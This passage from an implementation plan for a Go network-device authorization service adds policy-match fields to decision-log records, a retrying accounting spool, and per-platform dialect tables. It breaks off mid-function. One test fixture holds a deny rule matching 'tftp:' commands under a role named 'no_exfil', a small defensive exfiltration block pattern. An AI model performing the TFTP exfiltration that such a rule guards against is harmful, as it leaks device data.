Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 2: The decision log says what a record was decided against, and a sink can say no

**Files:**
- Modify: `internal/decision/log.go`, `internal/decision/reasons.go`
- Test: `internal/decision/policy_test.go`

**Interfaces:**
- Produces:
  - `type Sink interface { Emitter; Write(Record) error }`; `NewJSONLines(io.Writer) Sink` and
    `NewJSONLinesWithFailureHook(io.Writer, func()) Sink` now return it (every caller assigning
    to an `Emitter` still compiles). A refusal is logged and counted once, inside `Write`.
  - `decision.Policy` gains `Bundle, Blob string`, `MatchedDeny *PolicyRule`,
    `MatchedPermits []PolicyRule`, `Stage int`; `PolicyGrant` gains `Expires string`;
    `type PolicyRule struct { Rule []string; Specificity []int; Role string }`.
  - `const BlobPlatformMismatch Reason = "blob_platform_mismatch"`.
  Task 3's spool drains to a `Sink`; Task 6's `Outcome.Policy` builds the block; Task 13's broker
  re-emits a blob the `Sink` refused.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/decision/policy_test.go -->
```go
package decision

import (
	"bytes"
	"encoding/json"
	"errors"
	"testing"
	"time"
)

// An authorization record names the policy it was decided against and the
// rules that matched, in the shape spec §5.7 writes: the rule as its terms, the
// tuple it scored, and the role that carries it.
func TestAnAuthorizationRecordCarriesItsMatchedRules(t *testing.T) {
	var buf bytes.Buffer
	NewJSONLines(&buf).Emit(Record{TS: time.Unix(0, 0), Event: EventAuthorizeCommand, Verdict: VerdictDeny,
		Reason: NoPermitDominatesDeny, Policy: &Policy{Bundle: "sha256:b", Blob: "sha256:a",
			MatchedDeny:    &PolicyRule{Rule: []string{"*", "*", "/^tftp:/"}, Specificity: []int{1, 1, 2}, Role: "no_exfil"},
			MatchedPermits: []PolicyRule{{Rule: []string{"copy", "**"}, Specificity: []int{3, 0, 0}, Role: "net_operator"}}}})
	var raw struct {
		Policy map[string]any `json:"policy"`
	}
	if err := json.Unmarshal(buf.Bytes(), &raw); err != nil {
		t.Fatal(err)
	}
	p := raw.Policy
	deny, _ := p["matched_deny"].(map[string]any)
	rule, _ := deny["rule"].([]any)
	permits, _ := p["matched_permits"].([]any)
	if p["bundle"] != "sha256:b" || p["blob"] != "sha256:a" || deny["role"] != "no_exfil" ||
		len(rule) != 3 || len(permits) != 1 {
		t.Fatalf("policy block: %s", buf.String())
	}
	if _, ok := p["stage"]; ok {
		t.Fatalf("stage is omitted unless a pipeline stage was refused: %s", buf.String())
	}
	if BlobPlatformMismatch != "blob_platform_mismatch" {
		t.Fatalf("the §5.7 spelling is blob_platform_mismatch, got %q", BlobPlatformMismatch)
	}
}

// Write is Emit with the refusal returned, and a refusal is counted once
// whichever the caller used (the spool retries on Write; spec §5.8).
func TestWriteReturnsTheSinksRefusal(t *testing.T) {
	var failures int
	s := NewJSONLinesWithFailureHook(failingWriter{err: errors.New("no space left on device")}, func() { failures++ })
	if err := s.Write(Record{Event: EventAccount}); err == nil {
		t.Fatal("a refused write must return its error")
	}
	s.Emit(Record{Event: EventAccount})
	if failures != 2 {
		t.Fatalf("one count per refused record, got %d", failures)
	}
	var buf bytes.Buffer
	if err := NewJSONLines(&buf).Write(Record{Event: EventAccount}); err != nil || buf.Len() == 0 {
		t.Fatalf("a good write: %v %q", err, buf.String())
	}
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/decision/ -count=1`
Expected: FAIL to build — `unknown field Bundle in struct literal of type Policy` (and the same
for the other new fields, `s.Write undefined`, `undefined: BlobPlatformMismatch`).

- [ ] **Step 3: Extend the record and the sink**

<!-- patch: internal/decision/log.go -->
```diff
diff --git a/internal/decision/log.go b/internal/decision/log.go
index 1f85e89..4559b18 100644
--- a/internal/decision/log.go
+++ b/internal/decision/log.go
@@ -133,17 +133,47 @@ type Mint struct {
 	BlobHash    string   `json:"blob,omitempty"`
 }
 
-// Policy is what a mint record says about why it was allowed (spec §5.7): the
-// subject the principal matched and the grants that selected the device.
+// Policy is the record's policy identity and what it matched (spec §5.7).
+// Bundle and Blob are mandatory on every record that consulted policy: they
+// are what makes the record replayable, and a replay that disagrees with the
+// logged verdict is itself a finding. A mint record adds the subject and the
+// grants that selected the device; an authorization record adds the rules
+// that matched.
 type Policy struct {
+	// Bundle names the policy the blob was compiled from. Until plan 6
+	// publishes versioned bundles it is the sha256 of the policy file.
+	Bundle string `json:"bundle,omitempty"`
+	// Blob is the hash of the compiled blob the decision was made against.
+	Blob    string        `json:"blob,omitempty"`
 	Subject string        `json:"subject,omitempty"`
 	Grants  []PolicyGrant `json:"grants,omitempty"`
+	// MatchedDeny is the deny that decided a no_permit_dominates_deny, or the
+	// most specific deny a permit overrode.
+	MatchedDeny *PolicyRule `json:"matched_deny,omitempty"`
+	// MatchedPermits is every permit that matched the command, most specific
+	// first; the first is the one that decided a permit.
+	MatchedPermits []PolicyRule `json:"matched_permits,omitempty"`
+	// Stage is the 1-based pipeline stage a pipe_stage_denied refused. The
+	// stage's words are on the record already, in request.raw.
+	Stage int `json:"stage,omitempty"`
 }
 
 // PolicyGrant is one grant that selected the device.
 type PolicyGrant struct {
 	Scope string   `json:"scope"`
 	Roles []string `json:"roles,omitempty"`
+	// Expires is when the grant stops matching, rendered as ts is; empty is
+	// never.
+	Expires string `json:"expires,omitempty"`
+}
+
+// PolicyRule is one rule that matched a command: its terms as written, the
+// specificity tuple it scored against this command (spec §5.4), and the role
+// that carries it.
+type PolicyRule struct {
+	Rule        []string `json:"rule"`
+	Specificity []int    `json:"specificity"`
+	Role        string   `json:"role"`
 }
 
 // Blob is the `blob` event's body: the compiled blob whole, emitted once per
@@ -173,13 +203,24 @@ type Emitter interface {
 	Emit(Record)
 }
 
+// Sink is an Emitter that says whether the record reached its destination.
+// Emit is for the decision paths, which answer the device either way and
+// count a refusal; Write is for a caller that must not forget a record the
+// sink refused — the accounting spool, whose at-least-once contract ends
+// here, and the broker's blob emission, which has to emit a refused blob
+// again (roadmap, plan 4).
+type Sink interface {
+	Emitter
+	Write(Record) error
+}
+
 type jsonLines struct {
 	mu        sync.Mutex
 	w         io.Writer
 	onFailure func()
 }
 
-func NewJSONLines(w io.Writer) Emitter { return &jsonLines{w: w} }
+func NewJSONLines(w io.Writer) Sink { return &jsonLines{w: w} }
 
 // NewJSONLinesWithFailureHook is NewJSONLines plus a callback run once for
 // every record the sink refuses. A refused record is a record that does not
@@ -187,7 +228,7 @@ func NewJSONLines(w io.Writer) Emitter { return &jsonLines{w: w} }
 // the callback rather than a metric keeps this package's dependencies to the
 // standard library, so the record shape and the metric registry stay
 // independent of each other.
-func NewJSONLinesWithFailureHook(w io.Writer, onFailure func()) Emitter {
+func NewJSONLinesWithFailureHook(w io.Writer, onFailure func()) Sink {
 	return &jsonLines{w: w, onFailure: onFailure}
 }
 
@@ -198,13 +239,17 @@ func (j *jsonLines) failed() {
 	}
 }
 
-func (j *jsonLines) Emit(r Record) {
+func (j *jsonLines) Emit(r Record) { _ = j.Write(r) }
+
+// Write is Emit that returns the refusal. Either way a refused record is
+// logged and counted once, here, so a caller that retries does not have to.
+func (j *jsonLines) Write(r Record) error {
 	r.TS = r.TS.UTC()
 	b, err := json.Marshal(r)
 	if err != nil {
 		log.Printf("decision: dropping record that failed to marshal: %v", err)
 		j.failed()
-		return
+		return err
 	}
 	j.mu.Lock()
 	defer j.mu.Unlock()
@@ -213,6 +258,7 @@ func (j *jsonLines) Emit(r Record) {
 		log.Printf("decision: write failed: %v", err)
 		j.failed()
 	}
+	return err
 }
 
 // CredentialHash identifies a presented credential in the log without revealing it.
```

<!-- patch: internal/decision/reasons.go -->
```diff
diff --git a/internal/decision/reasons.go b/internal/decision/reasons.go
index 88ab6eb..3dc4f3f 100644
--- a/internal/decision/reasons.go
+++ b/internal/decision/reasons.go
@@ -49,7 +49,12 @@ const (
 	DeviceUnknown         Reason = "device_unknown"
 	PlatformUnknown       Reason = "platform_unknown"
 	BlobUnavailable       Reason = "blob_unavailable"
-	DeviceQuarantined     Reason = "device_quarantined"
+	// BlobPlatformMismatch: the context's blob was compiled for a platform
+	// other than the one the daemon's inventory gives this device. Its
+	// attributes and dialect are another platform's, so it is never answered
+	// from; operational, like blob_unavailable (spec §5.7).
+	BlobPlatformMismatch Reason = "blob_platform_mismatch"
+	DeviceQuarantined    Reason = "device_quarantined"
 )
 
 // Events.
```

- [ ] **Step 4: Run the package and the tree**

Run: `gofmt -l internal/decision; go test ./internal/decision/ -count=1 && go build ./...`
Expected: no gofmt output; PASS; the tree builds.

- [ ] **Step 5: Commit**

```bash
git add internal/decision/log.go internal/decision/reasons.go internal/decision/policy_test.go
git commit -m "feat: a decision sink that reports refusal, and the record's policy block

decision.Sink is an Emitter whose Write returns the sink's refusal;
jsonLines is it. A record's policy block gains bundle, blob, the
matched deny and permits with their tuples and roles, and the refused
pipeline stage (spec §5.7). blob_platform_mismatch joins the reason
constants after its spec row.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 3: The accounting spool does not advance past a record the sink refused

**Files:**
- Modify: `internal/daemon/acct/spool.go`
- Test: `internal/daemon/acct/sink_test.go`

**Interfaces:**
- Consumes: `decision.Sink` (Task 2).
- Produces: `NewSpool(capacity int, overflowPath string, sink decision.Sink, m *metrics.Metrics) (*Spool, error)`.
  `deliverLine` returns the sink's refusal; `drainOnce` stops at it with `drainOffset` at the
  refused record's first byte. `cmd/port49d/main.go` already passes the `Sink` Task 2's
  `NewJSONLinesWithFailureHook` returns, and every test passes `NewJSONLines`, so no caller
  changes.

The roadmap's requirement, verbatim in substance: the at-least-once guarantee ended at
`decision.Emitter.Emit`, which returns nothing, so the spool deleted `.draining` whether or not the
sink took the records. A refusal is not the file's fault, so it never counts toward the three-strike
quarantine, which is for a file the spool cannot read.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/daemon/acct/sink_test.go -->
```go
package acct

import (
	"errors"
	"path/filepath"
	"sync"
	"testing"

	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/testutil"

	"github.com/rhwendt/port49/internal/daemon/metrics"
	"github.com/rhwendt/port49/internal/decision"
)

// flakySink refuses every record while down, and records what it took.
type flakySink struct {
	mu   sync.Mutex
	down bool
	got  []string
}

func (f *flakySink) Emit(r decision.Record) { _ = f.Write(r) }

func (f *flakySink) Write(r decision.Record) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.down {
		return errors.New("sink: connection refused")
	}
	f.got = append(f.got, r.TaskID)
	return nil
}

// The spool's at-least-once contract reaches across the sink (roadmap, plan
// 4): a record the sink refuses is neither deleted nor skipped. The pass stops
// at it, the depth still counts it, and the next pass after the sink recovers
// delivers it, and everything after it, exactly once and in order.
func TestARefusedRecordIsOfferedAgain(t *testing.T) {
	sink := &flakySink{}
	m := metrics.New(prometheus.NewRegistry())
	sp, err := NewSpool(4, filepath.Join(t.TempDir(), "o.jsonl"), sink, m)
	if err != nil {
		t.Fatal(err)
	}
	for _, id := range []string{"a", "b", "c"} {
		if err := sp.Offer(decision.Record{Event: decision.EventAccount, TaskID: id}); err != nil {
			t.Fatal(err)
		}
	}
	sink.down = true
	if ok, n := sp.drainOnce(); ok || n != 0 {
		t.Fatalf("a refused first record is no progress: ok=%v forwarded=%d", ok, n)
	}
	if d := testutil.ToFloat64(m.SpoolDepth); d != 3 {
		t.Fatalf("depth after a refusal: %v, want 3", d)
	}
	sink.down = false
	if ok, n := sp.drainOnce(); !ok || n != 3 {
		t.Fatalf("after recovery: ok=%v forwarded=%d", ok, n)
	}
	if len(sink.got) != 3 || sink.got[0] != "a" || sink.got[2] != "c" {
		t.Fatalf("delivered %q, want a b c once each", sink.got)
	}
	if d := testutil.ToFloat64(m.SpoolDepth); d != 0 {
		t.Fatalf("depth after the drain: %v", d)
	}
}

// A refusal part-way through a file keeps what was already delivered
// delivered: the next pass resumes at the refused record, not at the start.
func TestARefusalMidFileResumesAtTheRefusedRecord(t *testing.T) {
	sink := &flakySink{}
	sp, err := NewSpool(4, filepath.Join(t.TempDir(), "o.jsonl"), &refuseAfter{next: sink, n: 1},
		metrics.New(prometheus.NewRegistry()))
	if err != nil {
		t.Fatal(err)
	}
	for _, id := range []string{"a", "b", "c"} {
		if err := sp.Offer(decision.Record{Event: decision.EventAccount, TaskID: id}); err != nil {
			t.Fatal(err)
		}
	}
	if ok, n := sp.drainOnce(); ok || n != 1 {
		t.Fatalf("one delivered, then a refusal: ok=%v forwarded=%d", ok, n)
	}
	if ok, n := sp.drainOnce(); !ok || n != 2 {
		t.Fatalf("the rest: ok=%v forwarded=%d", ok, n)
	}
	if len(sink.got) != 3 || sink.got[0] != "a" || sink.got[1] != "b" || sink.got[2] != "c" {
		t.Fatalf("delivered %q, want a b c once each", sink.got)
	}
}

// A sink that is down for good never gets a file quarantined: the records are
// fine, and quarantine is for a file the spool cannot read.
func TestARefusingSinkNeverQuarantines(t *testing.T) {
	sink := &flakySink{down: true}
	m := metrics.New(prometheus.NewRegistry())
	sp, err := NewSpool(4, filepath.Join(t.TempDir(), "o.jsonl"), sink, m)
	if err != nil {
		t.Fatal(err)
	}
	if err := sp.Offer(decision.Record{Event: decision.EventAccount, TaskID: "a"}); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 5; i++ {
		sp.drainOnce()
	}
	if q := testutil.ToFloat64(m.SpoolQuarantines); q != 0 {
		t.Fatalf("quarantined %v files over a sink outage", q)
	}
	sink.down = false
	if ok, n := sp.drainOnce(); !ok || n != 1 || len(sink.got) != 1 {
		t.Fatalf("after the outage: ok=%v forwarded=%d got=%q", ok, n, sink.got)
	}
}

// refuseAfter passes n records to next, then refuses exactly one, then passes
// everything.
type refuseAfter struct {
	next    decision.Sink
	n       int
	refused bool
}

func (r *refuseAfter) Emit(rec decision.Record) { _ = r.Write(rec) }

func (r *refuseAfter) Write(rec decision.Record) error {
	if r.n > 0 {
		r.n--
		return r.next.Write(rec)
	}
	if !r.refused {
		r.refused = true
		return errors.New("sink: refused once")
	}
	return r.next.Write(rec)
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/daemon/acct/ -run 'Refused|Refusal|Refusing' -count=1`
Expected: FAIL — `a refused first record is no progress: ok=true forwarded=3` (the old drain
forwards through `Emit` and never hears the refusal).

- [ ] **Step 3: Drain through the Sink and stop at a refusal**

<!-- patch: internal/daemon/acct/spool.go -->
```diff
diff --git a/internal/daemon/acct/spool.go b/internal/daemon/acct/spool.go
index c7fa175..bb26c70 100644
--- a/internal/daemon/acct/spool.go
+++ b/internal/daemon/acct/spool.go
@@ -51,7 +51,10 @@ const maxLineBytes = 1 << 20 // 1 MiB
 // Delivery is at-least-once: a crash between forwarding a record to the sink
 // and removing the .draining file re-forwards that record the next time Run
 // starts (TestSpoolResumesDrainingFile). Consumers of the sink must tolerate
-// duplicates. Every error on the drain path is logged (path and error, never
+// duplicates. The contract reaches across the last hop: a record the sink
+// refuses stops the pass at that record, drainOffset stays at its first byte,
+// and the next pass offers it again (TestARefusedRecordIsOfferedAgain). A
+// refusal is not the file's fault, so it never counts toward quarantine. Every error on the drain path is logged (path and error, never
 // record contents), throttled to once a minute per failure kind once a
 // condition persists, so a stuck filesystem cannot flood the log.
 //
@@ -87,7 +90,7 @@ const maxLineBytes = 1 << 20 // 1 MiB
 // first.
 type Spool struct {
 	path     string
-	sink     decision.Emitter
+	sink     decision.Sink
 	metrics  *metrics.Metrics
 	capacity int
 
@@ -114,6 +117,7 @@ type Spool struct {
 	lastStructLog     time.Time // throttles stat/open/seek/rename failure logs
 	lastQuarantineLog time.Time // throttles a failing quarantine rename's log
 	lastReadLog       time.Time // throttles the read-failure log
+	lastSinkLog       time.Time // throttles the sink-refusal log
 	drainOffset       int64     // bytes of .draining already forwarded; 0 for a file not yet started
 	offsetFailAt      int64     // drainOffset (or -1 for a structural failure) at the last failure
 	offsetFailCount   int       // consecutive failures at offsetFailAt
@@ -129,7 +133,7 @@ type Spool struct {
 // at start with one actionable line instead of becoming an ERROR reply per
 // record once devices are live, and it notes whether the existing file ends
 // mid-record so the first Offer does not append onto a fragment.
-func NewSpool(capacity int, overflowPath string, sink decision.Emitter, m *metrics.Metrics) (*Spool, error) {
+func NewSpool(capacity int, overflowPath string, sink decision.Sink, m *metrics.Metrics) (*Spool, error) {
 	if capacity < 1 {
 		return nil, errors.New("acct: spool capacity must be at least 1")
 	}
@@ -512,7 +516,17 @@ func (s *Spool) drainOnce() (ok bool, forwarded int) {
 				log.Printf("acct: dropping oversized spool line (over %d bytes)", maxLineBytes)
 				s.metrics.SpoolDrops.WithLabelValues(dropDrainUnparseable).Inc()
 			default:
-				s.deliverLine(bytes.TrimRight(line, "\n"))
+				if err := s.deliverLine(bytes.TrimRight(line, "\n")); err != nil {
+					// The sink refused this record. Nothing past it is
+					// forwarded and pos stays at its first byte, so the next
+					// pass starts with it: at-least-once holds across the
+					// sink, not only up to it (roadmap, plan 4). The record
+					// is counted by the sink's own failure hook.
+					s.applyForwarded(forwarded, pos)
+					s.logThrottled(&s.lastSinkLog, "acct: the decision log sink refused an accounting record; "+
+						"it stays in %s and is offered again: %v", draining, err)
+					return false, forwarded
+				}
 			}
 			forwarded++
 			pos += n
@@ -545,18 +559,20 @@ func (s *Spool) drainOnce() (ok bool, forwarded int) {
 // deliverLine unmarshals one record and forwards it, or logs and counts a
 // drop for a line that is empty or fails to unmarshal. An oversized line
 // never reaches here — drainOnce handles that case itself, since
-// readBoundedLine already discarded its content.
-func (s *Spool) deliverLine(line []byte) {
+// readBoundedLine already discarded its content. The only error it returns
+// is the sink's refusal: a line that will never parse is dropped, not
+// retried, and a record the sink would not take is retried, not dropped.
+func (s *Spool) deliverLine(line []byte) error {
 	if len(line) == 0 {
-		return
+		return nil
 	}
 	var r decision.Record
 	if err := r.UnmarshalJSON(line); err != nil {
 		log.Printf("acct: dropping spool line that failed to unmarshal: %v", err)
 		s.metrics.SpoolDrops.WithLabelValues(dropDrainUnparseable).Inc()
-		return
+		return nil
 	}
-	s.sink.Emit(r)
+	return s.sink.Write(r)
 }
 
 // applyForwarded records this pass's progress: depth drops by the records
```

- [ ] **Step 4: Run the package**

Run: `go test ./internal/daemon/acct/ -count=1 && go build ./...`
Expected: PASS, the existing spool tests included.

- [ ] **Step 5: Commit**

```bash
git add internal/daemon/acct/spool.go internal/daemon/acct/sink_test.go
git commit -m "fix: the accounting spool retries a record the sink refused

The spool drains to a decision.Sink and stops at a refused record,
leaving drainOffset at its first byte, so the next pass offers it
again: at-least-once now holds across the sink, not only up to it
(roadmap, plan 4). A refusal never counts toward quarantine.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 4: Each built-in platform's dialect, borrowed ahead from plan 5

**Files:**
- Create: `internal/platform/dialect.go`
- Test: `internal/platform/dialect_test.go`

**Interfaces:**
- Produces:
  - `type Dialect struct { PipeToken string; PipeAuthorized, StripCR, ExpandsAbbreviations bool; Supports []string; EntityClasses map[string][]string; Levels map[string][]string }`
  - `func DialectFor(name string) (Dialect, bool)` — the built-in, or the generic dialect and
    false; always a copy. `func Dialects() map[string]Dialect` — the table, copied.
  - `func (Dialect) Authorizes(capability string) bool`, `func (Dialect) Render(level string) ([]string, bool)`
    (exactly that level, no parent chain; a platform with nil `Levels` renders every level to
    nothing), `func (Dialect) PrivLvl(level string) (uint8, bool)` (a `priv-lvl` attribute's value,
    or plan 3's table `readonly` 1, `admin` 15 where the platform renders none).
  Tasks 10 and 11 compile against it; Task 15 and 16 read `Supports` and `PipeAuthorized` for the
  caveats.

Every value is cited in the table's comment or chosen to fail closed (Decided 4, 5). The one that
contradicts the spec — `pipe_authorized` — was corrected in the spec in Task 1.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/platform/dialect_test.go -->
```go
package platform

import (
	"reflect"
	"regexp"
	"testing"
)

// Every built-in platform has a dialect, and every dialect's pipe claim is the
// measured one: on each platform with a command path, a typed output modifier
// never reached port49 (tests/lab/results/L2-*.md). A dialect that claimed
// otherwise would have explain promise a protection the device does not give.
func TestEveryBuiltInPlatformHasAMeasuredDialect(t *testing.T) {
	for _, name := range Names() {
		d, ok := DialectFor(name)
		if !ok {
			t.Errorf("%s: known for session services but has no dialect", name)
		}
		if d.PipeAuthorized {
			t.Errorf("%s: PipeAuthorized, but no platform in the lab sent a modifier for authorization (L2)", name)
		}
		if d.PipeToken != "|" || !d.StripCR {
			t.Errorf("%s: pipe token %q strip_cr %v", name, d.PipeToken, d.StripCR)
		}
		if d.ExpandsAbbreviations {
			t.Errorf("%s: claims to expand abbreviations; that is unmeasured (spec §15, L21) and the claim fails open", name)
		}
		for class, patterns := range d.EntityClasses {
			for _, p := range patterns {
				if _, err := regexp.Compile(p); err != nil {
					t.Errorf("%s @%s: %v", name, class, err)
				}
			}
		}
	}
	if d, _ := DialectFor("juniper_junos"); d.Authorizes("commands") {
		t.Error("Junos sends no per-command authorization (L18; decision 21)")
	}
	if d, _ := DialectFor("arista_eos"); !d.Authorizes("commands") || !d.Authorizes("session") {
		t.Error("vEOS authorizes sessions and commands (L1, L10)")
	}
}

// One class, three spellings: @management is Management1 on EOS, mgmt0 on
// NX-OS, and fxp0 on Junos (spec §14, "Entity classes").
func TestManagementIsDefinedPerPlatform(t *testing.T) {
	for platform, name := range map[string]string{"arista_eos": "Management1", "cisco_nxos": "mgmt0", "juniper_junos": "fxp0"} {
		d, _ := DialectFor(platform)
		matched := false
		for _, p := range d.EntityClasses["management"] {
			if regexp.MustCompile(p).MatchString(name) {
				matched = true
			}
		}
		if !matched {
			t.Errorf("%s: @management does not name %s", platform, name)
		}
	}
	if d, _ := DialectFor("cisco_iosxe"); len(d.EntityClasses) != 0 {
		t.Errorf("IOS-XE defines no class until plan 5 says what its names are: %v", d.EntityClasses)
	}
}

// Levels render per platform. arista_eos is the one platform whose rendering is
// measured (L16); every other platform renders nothing, which is not a mapping
// error, and still has a number for the token's ceiling.
func TestLevelsRenderAndHaveANumber(t *testing.T) {
	eos, _ := DialectFor("arista_eos")
	if a, ok := eos.Render("admin"); !ok || !reflect.DeepEqual(a, []string{"priv-lvl=15"}) {
		t.Fatalf("eos admin: %v %v", a, ok)
	}
	if _, ok := eos.Render("operator"); ok {
		t.Fatal("eos operator is unmapped: nothing measured says what level it is")
	}
	if n, ok := eos.PrivLvl("readonly"); !ok || n != 1 {
		t.Fatalf("eos readonly: %d %v", n, ok)
	}
	nx, _ := DialectFor("cisco_nxos")
	if a, ok := nx.Render("operator"); !ok || len(a) != 0 {
		t.Fatalf("nx-os renders nothing, for any level: %v %v", a, ok)
	}
	if n, ok := nx.PrivLvl("admin"); !ok || n != 15 {
		t.Fatalf("nx-os admin's ceiling number: %d %v", n, ok)
	}
	if _, ok := nx.PrivLvl("operator"); ok {
		t.Fatal("operator has no number anywhere yet")
	}
}

// An unknown platform logs in on the generic dialect (spec §8), and the table
// cannot be edited through what DialectFor returns.
func TestUnknownPlatformsAreGenericAndTheTableIsCopied(t *testing.T) {
	d, ok := DialectFor("meinberg_lantime")
	if ok || d.PipeToken != "|" || !reflect.DeepEqual(d.Supports, []string{"session"}) || d.Levels != nil {
		t.Fatalf("generic: %+v %v", d, ok)
	}
	eos, _ := DialectFor("arista_eos")
	eos.EntityClasses["management"][0] = "changed"
	eos.Levels["admin"] = nil
	again, _ := DialectFor("arista_eos")
	if again.EntityClasses["management"][0] == "changed" || len(again.Levels["admin"]) != 1 {
		t.Fatal("DialectFor must return a copy")
	}
	if len(Dialects()) != len(Names()) {
		t.Fatalf("Dialects() has %d platforms, Names() %d", len(Dialects()), len(Names()))
	}
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/platform/ -count=1`
Expected: FAIL to build — `undefined: DialectFor`.

- [ ] **Step 3: Write the table**

<!-- write: internal/platform/dialect.go -->
```go
package platform

import (
	"strconv"
	"strings"
)

// Dialect is what the policy engine compiles into a blob about one platform
// (spec §5.1.2): how a command vector from this device is normalized, which of
// its entity names belong to which class, how an abstract privilege level is
// rendered, and what the device authorizes at all. The daemon never reads it:
// the broker compiles it into the blob, so a daemon and a broker cannot
// disagree about a rule.
//
// BORROWED AHEAD from plan 5, which builds the adapters in full — user
// overrides and layering, the pinned platform set, `redact`, projection — and
// replaces this table. Every value here is either measured and cited, or
// marked unmeasured and chosen in the direction that fails closed.
type Dialect struct {
	// PipeToken is the argument that separates a command from its output
	// modifiers (spec §3 rule 2). Only a whole argument equal to it splits.
	PipeToken string
	// PipeAuthorized says whether an output modifier ever reaches port49 on
	// this platform. Where it does not, the device applies the modifier after
	// port49 authorized the bare command, so a pipe rule protects nothing and
	// `port49 explain` must say so (spec §4, "Platform caveat").
	PipeAuthorized bool
	// StripCR drops a trailing `<cr>` argument (spec §3 rule 1).
	StripCR bool
	// ExpandsAbbreviations says the device sends the resolved command words
	// rather than what the operator typed. Where it is false, a deny's words
	// also match any abbreviation of them, so `rel` cannot slip past
	// `deny reload **` (spec §3 rule 4; blob.Normalize).
	ExpandsAbbreviations bool
	// Supports is the capability declaration of spec §9: which of `session`,
	// `commands` and `config_commands` the platform authorizes. The engine
	// evaluates every rule whatever it says; explain reads it to say which
	// rules the device will never ask about.
	Supports []string
	// EntityClasses maps a class name to the RE2 patterns of this platform's
	// names in it (spec §4, §8). A rule naming a class the platform does not
	// define is a policy load error.
	EntityClasses map[string][]string
	// Levels maps an abstract privilege level to the session attributes that
	// render it (spec §6). nil means the platform renders no level at all —
	// plan 3's shape for every platform but arista_eos (plan 3, Decided 6 and
	// Question 2) — and is not a load error; an entry missing from a non-nil
	// map is, unless the level's parent chain reaches one.
	Levels map[string][]string
}

// dialects are the built-in platforms. Each value is cited or marked
// unmeasured:
//
//   - PipeAuthorized is false on every platform with a command path, and that
//     is measured: typing `show clock | include AAAA…` sent port49 `show clock`
//     alone on vEOS 4.31.2F, NX-OS 10.4(2)F and IOS-XE 17.13.01a
//     (tests/lab/results/L2-arista_eos.md, L2-cisco_nxos.md,
//     L2-cisco_iosxe.md). Whether any other modifier reaches port49 anywhere
//     is unmeasured. Junos never authorizes a command.
//   - StripCR: every command authorization measured ends `cmd-arg=<cr>`
//     (L10-arista_eos.md, L10-cisco_nxos.md, L10-cisco_iosxe.md).
//   - ExpandsAbbreviations is false everywhere: whether a device sends `sh run`
//     or `show running-config` is unmeasured on every platform (spec §15, L21),
//     and false is the direction that fails closed.
//   - Supports: EOS, NX-OS and IOS-XE send per-command authorization (L1, L10);
//     Junos sends none, in 26 sessions on two images (L18; decision 21).
//     Config-command authorization is unmeasured, so no platform claims it.
//   - EntityClasses: interface NAMES, not device behaviour. `management` is the
//     interface the lab reaches each image on (fxp0 and mgmt0 in
//     tests/lab/configs/vjunos-startup.conf and nxos-startup.cfg; Management1
//     is spec §8's EOS example); `loopback` and `physical` are spec §8's EOS
//     example. IOS-XE defines none: its lab management interface is
//     GigabitEthernet1, which is a physical port by name.
//   - Levels: arista_eos renders `priv-lvl` for readonly and admin, applied by
//     vEOS on every lab run since 2026-09-20 (L16-arista_eos.md). `operator`
//     is unmapped — nothing measured says what level it is — so a policy
//     that lands an arista_eos session there is refused at load. Every other
//     platform renders nothing, as in plan 3; plan 5 fills them.
var dialects = map[string]Dialect{
	"arista_eos": {
		PipeToken: "|", PipeAuthorized: false, StripCR: true, ExpandsAbbreviations: false,
		Supports: []string{"session", "commands"},
		EntityClasses: map[string][]string{
			"management": {`^Management[0-9]+$`},
			"loopback":   {`^Loopback[0-9]+$`},
			"physical":   {`^Ethernet[0-9/.]+$`, `^Port-Channel[0-9]+$`},
		},
		Levels: map[string][]string{"readonly": {"priv-lvl=1"}, "admin": {"priv-lvl=15"}},
	},
	"cisco_nxos": {
		PipeToken: "|", PipeAuthorized: false, StripCR: true, ExpandsAbbreviations: false,
		Supports:      []string{"session", "commands"},
		EntityClasses: map[string][]string{"management": {`^mgmt[0-9]+$`}},
	},
	"cisco_iosxe": {
		PipeToken: "|", PipeAuthorized: false, StripCR: true, ExpandsAbbreviations: false,
		Supports: []string{"session", "commands"},
	},
	"juniper_junos": {
		PipeToken: "|", PipeAuthorized: false, StripCR: true, ExpandsAbbreviations: false,
		Supports:      []string{"session"},
		EntityClasses: map[string][]string{"management": {`^(fxp0|em0)$`}},
	},
}

// generic is the dialect of a platform port49 ships no adapter for (spec §8,
// "Unknown platforms"): the device still logs in, nothing is rendered for it,
// no modifier is claimed to reach port49, and abbreviations are assumed.
var generic = Dialect{PipeToken: "|", StripCR: true, Supports: []string{"session"}}

// ceilingLevels is the priv-lvl number a level stands for on a platform that
// renders no level, where the number is still needed: the token's
// max_privilege is compared against the priv_lvl a device puts on a request
// (spec §5.3, §7). It is plan 3's table; `operator` is absent for the reason
// arista_eos does not map it.
var ceilingLevels = map[string]uint8{"readonly": 1, "admin": 15}

// DialectFor returns name's dialect and whether port49 ships one. An unknown
// platform gets the generic dialect. The maps are copies: a caller cannot edit
// the table through them.
func DialectFor(name string) (Dialect, bool) {
	d, ok := dialects[name]
	if !ok {
		d = generic
	}
	return d.clone(), ok
}

// Dialects is the whole built-in table, copied.
func Dialects() map[string]Dialect {
	out := make(map[string]Dialect, len(dialects))
	for name, d := range dialects {
		out[name] = d.clone()
	}
	return out
}

func (d Dialect) clone() Dialect {
	d.Supports = append([]string(nil), d.Supports...)
	if d.EntityClasses != nil {
		classes := make(map[string][]string, len(d.EntityClasses))
		for k, v := range d.EntityClasses {
			classes[k] = append([]string(nil), v...)
		}
		d.EntityClasses = classes
	}
	if d.Levels != nil {
		levels := make(map[string][]string, len(d.Levels))
